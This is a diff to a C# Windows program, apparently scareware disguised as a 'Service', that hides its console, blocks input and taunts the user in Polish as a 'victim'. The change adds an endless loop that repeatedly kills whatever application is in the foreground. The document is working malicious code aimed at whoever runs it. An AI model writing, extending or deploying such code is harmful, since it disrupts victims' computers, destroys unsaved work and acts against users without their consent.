@@ -7,6 +7,7 @@
     using System.Drawing;
     using System.Drawing.Imaging;
     using System.IO;
+    using System.Linq;
     using System.Net;
     using System.Runtime.InteropServices;
     using System.Threading;
@@ -16,6 +17,7 @@
 
     using Timer = System.Timers.Timer;
 
+    [SuppressMessage("ReSharper", "FunctionNeverReturns")]
     internal static class Service
     {
         [DllImport("kernel32.dll", SetLastError = true)]
@@ -25,8 +27,8 @@
         [DllImport("kernel32.dll")]
         private static extern bool FreeConsole();
 
-        [DllImport("user32.dll", CharSet = CharSet.Auto)]
-        internal static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetForegroundWindow();
 
         private static readonly Random Random = new Random();
         
@@ -98,7 +100,7 @@
         [SuppressMessage("ReSharper", "LocalizableElement")]
         private static async void ScareAsync()
         {
-            await Task.Delay(Random.Next(5, 30).Seconds());
+            await Task.Delay(Random.Next(30, 180).Seconds());
 
             using (new InputBlock())
             {
@@ -118,14 +120,23 @@
 
             await Task.Delay(Random.Next(20, 50).Seconds());
 
-            for (var i = 0; i < Random.Next(4, 10); i++)
+            var random = Random.Next(4, 10);
+
+            for (var i = 0; i < random; i++)
             {
                 NotepadHelper.ShowMessage($"Już po Tobie ...{Environment.NewLine}:)", "Kochana ofiaro!");
+            }
+
+            while (true)
+            {
+                await Task.Delay(Random.Next(300, 1000).Seconds());
+
+                var handle = GetForegroundWindow();
+                Process.GetProcesses().Single(p => p.Id != 0 && p.Handle == handle).Kill();
             }
         }
 
         [SuppressMessage("ReSharper", "LocalizableElement")]
-        [SuppressMessage("ReSharper", "FunctionNeverReturns")]
         private static async void BackgroundUpdateAsync()
         {
             await Task.Delay(300.Seconds());
